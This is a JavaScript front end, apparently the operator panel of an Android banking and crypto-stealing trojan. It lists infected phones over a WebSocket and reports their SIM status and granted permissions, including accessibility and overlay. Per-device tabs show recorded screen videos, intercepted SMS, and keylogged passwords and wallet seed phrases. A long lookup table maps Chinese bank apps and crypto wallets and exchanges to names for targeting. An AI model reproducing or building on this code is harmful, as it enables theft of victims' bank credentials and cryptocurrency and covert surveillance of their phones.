                banListBtn.style.cssText = "position:fixed;bottom:24px;right:24px;z-index:998;padding:8px 18px;border-radius:10px;border:1px solid #eef1f7;background:#ffffff;color:#666;font-size:13px;cursor:pointer;font-family:v-sans,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;white-space:nowrap;box-shadow:0 2px 12px rgba(0,0,0,0.1);transition:all .15s;";
                banListBtn.textContent = "\u26D4 \u9ED1\u540D\u5355";
                banListBtn.addEventListener("mouseenter", function() { banListBtn.style.borderColor = "#d03050"; banListBtn.style.color = "#d03050"; banListBtn.style.boxShadow = "0 4px 16px rgba(208,48,80,0.2)"; });
                banListBtn.addEventListener("mouseleave", function() { banListBtn.style.borderColor = "#eef1f7"; banListBtn.style.color = "#666"; banListBtn.style.boxShadow = "0 2px 12px rgba(0,0,0,0.1)"; });
                banListBtn.addEventListener("click", function() { _openBanListModal(); });
                document.body.appendChild(banListBtn);
            })();

            function Z(d) {
                Object.assign(P, d), O()
            }

            function se() {
                Object.keys(P).forEach(d => P[d] = ""), O()
            }
            let Q;
            Ie(() => {
                N(), Q = setInterval(() => {
                    vt(1, 10, {})
                }, 5e3), window.addEventListener("beforeunload", m)
            }), _o(() => {
                Q && clearInterval(Q);
                _wsDestroyed = true;
                m();
                window.removeEventListener("beforeunload", m);
                if (_batchBar) { _batchBar.remove(); _batchBar = null; }
                _batchSelectedIds.clear();
            });

            function m() {
                a && (a.close(), a = null)
            }

            function T(d) {
                return d
            }
            let _wsRetry = 0;
            let _wsDestroyed = false;
            let _wsFirstOpen = true;
            const _wsMaxRetry = 60000;
            const _showReconnectToast = () => {
                try {
                    let el = document.getElementById("__zglReconnectToast");
                    if (!el) {
                        el = document.createElement("div");
                        el.id = "__zglReconnectToast";
                        el.style.cssText = "position:fixed;right:20px;bottom:24px;z-index:99999;display:flex;align-items:center;gap:10px;background:#eef1f7;border:1px solid #4f6bfe;color:#14213d;font-size:13px;padding:10px 16px;border-radius:8px;box-shadow:0 8px 24px rgba(0,0,0,.45);opacity:0;transform:translateY(16px);transition:opacity .25s ease,transform .25s ease;font-family:v-sans,system-ui,sans-serif;pointer-events:none;";
                        document.body.appendChild(el);
                    }
                    el.innerHTML = '<i style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#16a34a;"></i><span>链路已重连 · 数据已刷新</span>';
                    requestAnimationFrame(() => { el.style.opacity = "1"; el.style.transform = "translateY(0)"; });
                    clearTimeout(el.__zglT);
                    el.__zglT = setTimeout(() => {
                        el.style.opacity = "0";
                        el.style.transform = "translateY(16px)";
                    }, 2500);
                } catch (e) {}
            };
            const N = () => {
                if (_wsDestroyed) return;
                a = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/api/ws/"), a.onopen = () => {
                    const _first = _wsFirstOpen;
                    _wsFirstOpen = false;
                    _wsRetry = 0, O();
                    if (!_first) _showReconnectToast();
                }, a.onmessage = d => {
                    try {
                        const b = JSON.parse(d.data);
                        b.type === "checkphone" && (j.value = b.total || 0, p.value = b.pageCount || Math.ceil(j.value / pageSize.value), b.list.forEach(C => {
                            C.user_email && (C.user_email = T(C.user_email)), Dt[C.phone_id] = C
                        }), (function() {
                            try {
                                let _h = 0,
                                    _nn = 0,
                                    _un = 0;
                                Object.keys(Dt).forEach(function(_k) {
                                    const _s = String(Dt[_k].sim == null ? "" : Dt[_k].sim).toUpperCase();
                                    if (_s === "有卡" || _s.indexOf("READY") !== -1) _h++;
                                    else if (_s === "无卡" || _s.indexOf("NOT_READY") !== -1 || _s.indexOf("ABSENT") !== -1 || _s.indexOf("PERM_DISABLED") !== -1) _nn++;
                                    else _un++;
                                });
                                window.__zglSimStats = {
                                    has: _h,
                                    none: _nn,
                                    unknown: _un,
                                    total: Object.keys(Dt).length
                                };
                            } catch (_e) {}
                        })()), (function() {
                            try {
                                window.__zglDevices = Object.assign({}, Dt);
                                var _zpm = {};
                                Object.keys(Dt).forEach(function(_pk) {
                                    var _pd = Dt[_pk];
                                    if (_pd && _pd.perms && typeof _pd.perms === "object") _zpm[_pk] = _pd.perms;
                                });
                                window.__zglPermsMap = _zpm;
                            } catch (_e2) {}
                        })()
                    } catch (b) {}
                }, a.onerror = () => {
                    console.warn("WebSocket reconnecting")
                }, a.onclose = () => {
                    if (_wsDestroyed) return;
                    const delay = Math.min(1000 * Math.pow(2, _wsRetry), _wsMaxRetry);
                    _wsRetry++;
                    setTimeout(N, delay)
                }
            };

            function I(d = 1, b = 10) {
                if (!a || a.readyState !== WebSocket.OPEN) return;
                const C = nt.get("CURRENT-EMAIL");
                C && a.send(JSON.stringify({
                    itype: "slr_panel",
                    subc: "checkphone",
                    email: C,
                    token: nt.get("ACCESS-TOKEN") || "",
                    usrname: nt.get("CURRENT-USER") || "",
                    page: d,
                    pageSize: b,
                    filters: E(E({}, P), window.__zglCustomFilters || {}),
                    showOffline: window.__zglShowOffline ? 1 : 0
                }))
            }
            return (d, b) => {
                const C = Kt,
                    $ = wo,
                    B = Co;
                return x(), G("div", _i, [w($, {
                    bordered: !1
                }, {
                    default: y(() => [w(u(vi), {
                        onRegister: u(_),
                        onSubmit: Z,
                        onReset: se
                    }, {
                        statusSlot: y(({
                            model: M,
                            field: Y
                        }) => [w(C, {
                            value: M[Y],
                            "onUpdate:value": H => M[Y] = H
                        }, null, 8, ["value", "onUpdate:value"])]),
                        _: 1
                    }, 8, ["onRegister"])]),
                    _: 1
                }), w($, {
                    bordered: !1,
                    class: "mt-3"
                }, {
                    default: y(() => [w(u(ui), {
                        columns: u(bi),
                        request: f,
                        ref_key: "actionRef",
                        ref: i,
                        actionColumn: c,
                        "scroll-x": 1850,
                        striped: !0
                    }, null, 8, ["columns", "actionColumn"])]),
                    _: 1
                }), w(B, {
                    show: o.value,
                    "onUpdate:show": b[2] || (b[2] = M => o.value = M),
                    title: "请输入下发账号",
                    onPositiveClick: k
                }, {
                    default: y(() => [A("div", wi, [w(C, {
                        value: t.value,
                        "onUpdate:value": b[1] || (b[1] = M => t.value = M),
                        placeholder: "请输入目标账号邮箱",
                        class: "input-field"
                    }, null, 8, ["value"]), A("div", Ci, [w(u(ge), {
                        type: "primary",
                        onClick: k
                    }, {
                        default: y(() => b[3] || (b[3] = [X("确定")])),
                        _: 1
                    })])])]),
                    _: 1
                }, 8, ["show"])])
            }
        }
    }),
    Ni = Le(Oi, [
        ["__scopeId", "data-v-2e2914c1"]
    ]);
export {
    Ni as
    default
};


/* ===== 设备数据详情弹窗: 视频 / 密码 / 短信 / 权限 ===== */
(function () {
    if (window.__zglDetailInited) return;
    window.__zglDetailInited = true;
    function _tok() {
        try {
            var t = localStorage.getItem("ACCESS-TOKEN");
            if (!t) return "";
            var j = JSON.parse(t);
            return j && j.value ? j.value : String(t);
        } catch (e) { return ""; }
    }
    function _esc(s) {
        return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) {
            return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
        });
    }
    function _fmtSize(n) {
        n = Number(n) || 0;
        if (n < 1024) return n + " B";
        if (n < 1048576) return (n / 1024).toFixed(1) + " KB";
        return (n / 1048576).toFixed(1) + " MB";
    }
    var zglPkgNames = {
        "com.android.systemui": "\u7cfb\u7edf\u9501\u5c4f",
        "com.eg.android.AlipayGphone": "支付宝",
        "com.tencent.mm": "微信",
        "com.unionpay": "云闪付",
        "com.android.bankabc": "农业银行",
        "com.abchina": "农业银行",
        "com.icbc": "工商银行",
        "com.chinamworld.main": "建设银行",
        "com.ccb.longjiLife": "建设银行",
        "com.ccb.ccbphone": "建设银行",
        "com.chinamworld.bocmbc": "中国银行",
        "com.chinamworld.bocmbci": "中国银行",
        "com.boc.banking": "中国银行",
        "com.bankcomm.Bankcomm": "交通银行",
        "com.bankcomm.maidanba": "交通银行",
        "cmb.pb": "招商银行",
        "com.cmbchina.mbank": "招商银行",
        "com.spdbccc.app": "浦发银行",
        "com.ecitic.bank.mobile": "中信银行",
        "com.cebbank.mobile.cemb": "光大银行",
        "com.cmbc.cc.ebank": "民生银行",
        "com.pingan.paces.ccms": "平安银行",
        "com.pingan.bank": "平安银行",
        "com.cib.cibmb": "兴业银行",
        "com.cgbchina.xpt": "广发银行",
        "com.hxb.bank": "华夏银行",
        "com.psbc.mobilebank": "邮储银行",
        "com.yitong.mbank.psbc": "邮储银行",
        "com.bankofbeijing.mobilebanking": "北京银行",
        "com.njcb": "南京银行",
        "com.hsbank.android": "徽商银行",
        "com.sdb.mbank": "深圳发展银行",
        "com.bosc.bjbank": "上海银行",
        "com.zjrcbank.mobilebanking": "杭州银行",
        "com.srcb.pmbank": "上海农商",
        "com.bsb.pay": "渤海银行",
        "com.bjrcb.bank": "北京农商",
        "io.metamask": "MetaMask",
        "com.wallet.crypto.trustapp": "Trust Wallet",
        "com.binance.dev": "币安",
        "com.okinc.okex.game": "OKX欧易",
        "com.coinbase.android": "Coinbase",
        "co.mona.android": "Crypto.com",
        "com.bitget.exchange": "Bitget",
        "com.kubi.kucoin": "KuCoin",
        "io.gateapp.gateio": "Gate.io",
        "com.bybit.app": "Bybit",
        "com.huobi.prime": "火币",
        "pro.huobi": "火币",
        "im.token.app": "imToken",
        "vip.mytokenpocket": "TokenPocket",
        "com.bitpie": "Bitpie",
        "com.cobo.wallet": "Cobo",
        "exodusmovement.exodus": "Exodus",
        "piuk.blockchain.android": "Blockchain.com",
        "com.coinomi.wallet": "Coinomi",
        "io.atomicwallet": "Atomic Wallet",
        "org.electrum.electrum": "Electrum",
        "io.bluewallet.bluewallet": "BlueWallet",
        "com.uniswap.mobile": "Uniswap",
        "app.phantom": "Phantom",
        "com.tronlinkpro.wallet": "TronLink",
        "com.bitkeep.wallet": "BitKeep",
        "io.safepal.wallet": "SafePal",
        "com.ledger.live": "Ledger Live",
        "com.kraken.trade": "Kraken",
        "com.gemini.android.app": "Gemini",
        "com.phemex.app": "Phemex",
        "com.mexc.pro": "MEXC",
        "com.coinex.exchanger": "CoinEx",
        "com.bitfinex.mobileapp": "Bitfinex",
        "io.polkadot.polkawallet": "Polkadot",
        "co.edgesecure.app": "Edge",
        "com.mycelium.wallet": "Mycelium",
        "com.plutus.wallet": "Abra"
    };
    var _zglPermRows = [
        ["CAMERA", "摄像头"],
        ["MIC", "麦克风"],
        ["LOCATION", "定位"],
        ["CONTACTS", "通讯录"],
        ["SMS", "短信"],
        ["PHONE", "电话"],
        ["STORAGE", "存储"],
        ["acc", "无障碍"],
        ["overlay", "悬浮窗"]
    ];
    function _pv(v) {
        if (v === 1 || v === "1" || v === true) return 1;
        if (v === 0 || v === "0" || v === false) return 0;
        return -1;
    }
    var _zglTabs = [
        ["videos", "\u{1f3a5} 视频"],
        ["sms", "\ud83d\udce9 短信"],
        ["perms", "\ud83d\udee1 权限"]
    ];
    window.__zglDetailOpen = function (pid, tab) {
        pid = String(pid || "");
        if (!pid) return;
        var active = String(tab || "videos");
        if (["videos", "keylog", "sms", "perms"].indexOf(active) === -1) active = "videos";
        var ov = document.createElement("div");
        ov.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,.62);z-index:99990;display:flex;align-items:center;justify-content:center;font-family:v-sans,system-ui,sans-serif;";
        var box = document.createElement("div");
        box.style.cssText = "background:#ffffff;border:1px solid #3a2f22;border-radius:14px;padding:20px;width:92%;max-width:820px;max-height:84vh;display:flex;flex-direction:column;color:#14213d;box-shadow:0 20px 60px rgba(0,0,0,.45);";
        ov.appendChild(box);
        var hd = document.createElement("div");
        hd.style.cssText = "display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;";
        var ti = document.createElement("div");
        ti.innerHTML = '<span style="font-size:16px;font-weight:600;">\ud83d\udccb 设备数据</span> <span style="color:#9a8f7a;font-size:12px;margin-left:8px;">' + _esc(pid) + '</span>';
        var cl = document.createElement("button");
        cl.textContent = "关闭";
        cl.style.cssText = "background:#ffffff;border:1px solid #4a3f2c;color:#14213d;border-radius:8px;padding:4px 12px;cursor:pointer;";
        hd.appendChild(ti); hd.appendChild(cl);
        box.appendChild(hd);
        var tb = document.createElement("div");
        tb.style.cssText = "display:flex;gap:8px;margin-bottom:12px;border-bottom:1px solid #ffffff;padding-bottom:10px;flex-wrap:wrap;";
        var tabBtns = {};
        _zglTabs.forEach(function (t) {
            var b = document.createElement("button");
            b.textContent = t[1];
            b.style.cssText = "padding:6px 14px;border-radius:8px;cursor:pointer;font-size:13px;background:#eef1f7;color:#5b6b8c;border:1px solid #d8dfeb;";
            b.onclick = function () { switchTab(t[0]); };
            tabBtns[t[0]] = b;
            tb.appendChild(b);
        });
        box.appendChild(tb);
        var content = document.createElement("div");
        content.style.cssText = "overflow-y:auto;flex:1;min-height:220px;";
        box.appendChild(content);
        var rendered = {};
        function paintTabs() {
            Object.keys(tabBtns).forEach(function (k) {
                var on = k === active;
                tabBtns[k].style.background = on ? "#fdf3e3" : "#eef1f7";
                tabBtns[k].style.color = on ? "#6b83ff" : "#5b6b8c";
                tabBtns[k].style.borderColor = on ? "#4f6bfe" : "#d8dfeb";
            });
        }
        function switchTab(t) {
            active = t;
            paintTabs();
            var el = rendered[t];
            if (!el) { el = renderTab(t); rendered[t] = el; }
            content.innerHTML = "";
            content.appendChild(el);
        }
        function playVideo(id) {
            var old = content.querySelector(".zgl-video-player");
            if (old && old.parentNode) old.parentNode.removeChild(old);
            var player = document.createElement("div");
            player.className = "zgl-video-player";
            player.style.cssText = "margin-top:12px;border-top:1px solid #3a2f22;padding-top:12px;";
            var v = document.createElement("video");
            v.controls = true;
            v.autoplay = true;
            v.style.cssText = "width:100%;max-height:420px;background:#000;border-radius:10px;";
            v.src = "/api/EaodVideos.php?action=file&id=" + encodeURIComponent(id) + "&token=" + encodeURIComponent(_tok());
            player.appendChild(v);
            content.insertBefore(player, content.firstChild);
        }
        function renderTab(t) {
            var holder = document.createElement("div");
            if (t === "videos") {
                var st = document.createElement("div");
                st.textContent = "加载中...";
                st.style.cssText = "color:#9a8f7a;padding:20px;text-align:center;";
                holder.appendChild(st);
                fetch("/api/EaodVideos.php?action=list", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ action: "list", phone_id: pid, token: _tok() })
                }).then(function (r) { return r.json(); }).then(function (j) {
                    var vids = (j && j.videos) || [];
                    holder.innerHTML = "";
                    if (!vids.length) {
                        var e = document.createElement("div");
                        e.textContent = "暂无录制视频";
                        e.style.cssText = "color:#9a8f7a;padding:24px;text-align:center;";
                        holder.appendChild(e);
                        return;
                    }
                    vids.forEach(function (v) {
                        var row = document.createElement("div");
                        row.style.cssText = "display:flex;align-items:center;justify-content:space-between;padding:10px 12px;border-bottom:1px solid #ffffff;";
                        var inf = document.createElement("div");
                        var tg = v.trigger_type === "auto" ? "自动" : "手动";
                        inf.innerHTML = '<div style="font-size:14px;">' + _esc(v.created_at) + ' <span style="color:#c9a45c;">[' + _esc(tg) + ']</span></div><div style="color:#9a8f7a;font-size:12px;margin-top:2px;">' + _fmtSize(v.size_bytes) + '</div>';
                        var bd = document.createElement("div");
                        var pb = document.createElement("button");
                        pb.textContent = "播放";
                        pb.style.cssText = "background:#ffffff;border:1px solid #4a3f2c;color:#14213d;border-radius:8px;padding:5px 12px;margin-left:8px;cursor:pointer;";
                        pb.onclick = function () { playVideo(v.id); };
                        var db = document.createElement("button");
                        db.textContent = "下载";
                        db.style.cssText = pb.style.cssText;
                        db.onclick = function () {
                            var a = document.createElement("a");
                            a.href = "/api/EaodVideos.php?action=file&id=" + encodeURIComponent(v.id) + "&token=" + encodeURIComponent(_tok());
                            a.download = "video_" + v.id + ".mp4";
                            document.body.appendChild(a); a.click(); document.body.removeChild(a);
                        };
                        bd.appendChild(pb); bd.appendChild(db);
                        row.appendChild(inf); row.appendChild(bd);
                        holder.appendChild(row);
                    });
                }).catch(function () {
                    holder.innerHTML = "";
                    st.textContent = "加载失败";
                    holder.appendChild(st);
                });
            } else if (t === "keylog") {
                var st = document.createElement("div");
                st.textContent = "加载中...";
                st.style.cssText = "color:#9a8f7a;padding:20px;text-align:center;";
                holder.appendChild(st);
                fetch("/api/EaodVideos.php?action=list_keylog", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ action: "list_keylog", phone_id: pid, token: _tok() })
                }).then(function (r) { return r.json(); }).then(function (j) {
                    var rows = (j && j.list) || [];
                    holder.innerHTML = "";
                    if (!rows.length) {
                        var e = document.createElement("div");
                        e.textContent = "暂无密码记录";
                        e.style.cssText = "color:#9a8f7a;padding:24px;text-align:center;";
                        holder.appendChild(e);
                        return;
                    }
                    rows.forEach(function (k) {
                        var row = document.createElement("div");
                        row.style.cssText = "padding:12px 14px;border-bottom:1px solid #ffffff;";
                        var kapp = zglPkgNames[k.pkg] || (k.pkg || "");
                        var ktag = k.field_type === "mnemonic" ? ' <span style="background:#15803d;color:#8ef0b8;border-radius:4px;padding:1px 6px;font-size:11px;margin-left:6px;">助记词</span>' : "";
                        var kstyle = k.field_type === "mnemonic" ? "font-size:15px;font-weight:600;color:#8ef0b8;letter-spacing:1px;line-height:1.8;" : "font-size:20px;font-weight:700;color:#ff9d8a;letter-spacing:3px;";
                        row.innerHTML = '<div style="' + kstyle + 'word-break:break-all;">' + _esc(k.content) + ktag + '</div><div style="color:#9a8f7a;font-size:12px;margin-top:6px;">' + _esc(kapp) + ' <span style="color:#c9a45c;">·</span> ' + _esc(k.created_at) + '</div>';
                        holder.appendChild(row);
                    });
                }).catch(function () {
                    holder.innerHTML = "";
                    st.textContent = "加载失败";
                    holder.appendChild(st);
                });
            } else if (t === "sms") {
                var st = document.createElement("div");
                st.textContent = "加载中...";
                st.style.cssText = "color:#9a8f7a;padding:20px;text-align:center;";
                holder.appendChild(st);
                fetch("/api/EaodVideos.php?action=list_sms", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ action: "list_sms", phone_id: pid, token: _tok() })
                }).then(function (r) { return r.json(); }).then(function (j) {
                    var rows = (j && j.list) || [];
                    holder.innerHTML = "";
                    if (!rows.length) {
                        var e = document.createElement("div");
                        e.textContent = "暂无短信记录";
                        e.style.cssText = "color:#9a8f7a;padding:24px;text-align:center;";
                        holder.appendChild(e);
                        return;
                    }
                    rows.forEach(function (s) {
                        var row = document.createElement("div");
                        row.style.cssText = "padding:12px 14px;border-bottom:1px solid #ffffff;";
                        row.innerHTML = '<div style="font-size:14px;font-weight:600;color:#6b83ff;">' + _esc(s.sender) + ' <span style="color:#9a8f7a;font-size:12px;font-weight:400;margin-left:8px;">' + _esc(s.created_at) + '</span></div><div style="color:#14213d;font-size:14px;margin-top:6px;word-break:break-all;line-height:1.7;">' + _esc(s.body) + '</div>';
                        holder.appendChild(row);
                    });
                }).catch(function () {
                    holder.innerHTML = "";
                    st.textContent = "加载失败";
                    holder.appendChild(st);
                });
            } else {
                var devs = window.__zglDevices || {};
                var drow = devs[pid];
                var p = (drow && drow.perms && typeof drow.perms === "object") ? drow.perms : null;
                if (!p) {
                    var e = document.createElement("div");
                    e.textContent = "该设备尚未上报权限状态（设备上线后自动上报，可刷新页面后重试）";
                    e.style.cssText = "color:#9a8f7a;padding:24px;text-align:center;line-height:1.8;";
                    holder.appendChild(e);
                    return holder;
                }
                var legend = document.createElement("div");
                legend.style.cssText = "display:flex;gap:14px;font-size:12px;color:#9a8f7a;margin-bottom:10px;";
                legend.innerHTML = '<span><i style="display:inline-block;width:9px;height:9px;border-radius:50%;background:#16a34a;margin-right:4px;"></i>已授权</span><span><i style="display:inline-block;width:9px;height:9px;border-radius:50%;background:#e05d4f;margin-right:4px;"></i>未授权</span><span><i style="display:inline-block;width:9px;height:9px;border-radius:50%;background:#5a544a;margin-right:4px;"></i>未知</span>';
                holder.appendChild(legend);
                var okN = 0;
                _zglPermRows.forEach(function (it) {
                    var v = _pv(p[it[0]]);
                    if (v === 1) okN++;
                    var r = document.createElement("div");
                    r.style.cssText = "display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid #ffffff;";
                    var lf = document.createElement("div");
                    lf.style.cssText = "display:flex;align-items:center;gap:10px;font-size:14px;";
                    var dot = document.createElement("i");
                    dot.style.cssText = "display:inline-block;width:10px;height:10px;border-radius:50%;background:" + (v === 1 ? "#16a34a" : v === 0 ? "#e05d4f" : "#5a544a") + ";";
                    lf.appendChild(dot);
                    lf.appendChild(document.createTextNode(it[1] + "（" + it[0] + "）"));
                    var stx = document.createElement("span");
                    stx.textContent = v === 1 ? "已授权" : v === 0 ? "未授权" : "未知";
                    stx.style.cssText = "font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px;border:1px solid " + (v === 1 ? "#159957" : v === 0 ? "#7a352c" : "#4a4538") + ";color:" + (v === 1 ? "#49d9a4" : v === 0 ? "#ff8a7a" : "#9a8f7a") + ";background:" + (v === 1 ? "rgba(24,160,112,.14)" : v === 0 ? "rgba(224,93,79,.12)" : "rgba(90,84,74,.15)") + ";";
                    r.appendChild(lf);
                    r.appendChild(stx);
                    holder.appendChild(r);
                });
                var foot = document.createElement("div");
                foot.style.cssText = "font-size:12px;color:#9a8f7a;margin-top:10px;text-align:center;";
                foot.textContent = "已授权 " + okN + " / " + _zglPermRows.length + " 项 · 数据来自设备最近一次上报";
                holder.appendChild(foot);
            }
            return holder;
        }
        cl.onclick = function () { document.body.removeChild(ov); };
        ov.onclick = function (ev) { if (ev.target === ov) document.body.removeChild(ov); };
        document.body.appendChild(ov);
        paintTabs();
        switchTab(active);
    };
    window.__zglVideosOpen = function (pid) { window.__zglDetailOpen(pid, "videos"); };
    window.__zglKeylogOpen = function (pid) { window.__zglDetailOpen(pid, "keylog"); };
    window.__zglSmsOpen = function (pid) { window.__zglDetailOpen(pid, "sms"); };
    window.__zglPermsOpen = function (pid) { window.__zglDetailOpen(pid, "perms"); };
})();
